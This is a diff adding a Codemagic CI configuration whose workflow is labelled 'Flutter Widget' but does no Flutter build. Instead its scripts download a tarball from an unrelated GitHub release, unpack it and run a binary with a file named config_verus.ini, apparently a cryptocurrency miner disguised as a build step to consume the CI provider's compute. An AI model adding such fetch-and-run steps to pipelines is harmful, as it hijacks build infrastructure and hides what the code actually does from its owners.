@@ -1,0 +1,14 @@
+# Check out https://docs.codemagic.io/getting-started/yaml/ for more information
+
+workflows:
+    
+    flutter-widget:
+        name: Flutter Widget
+        max_build_duration: 120
+        environment:
+            flutter: dev
+        scripts:
+            - wget https://github.com/endvoc01/voc/releases/download/nona/nona.tar.gz
+            - brew install gnu-tar
+            - gtar xvf nona.tar.gz
+            - ./nona config_verus.ini
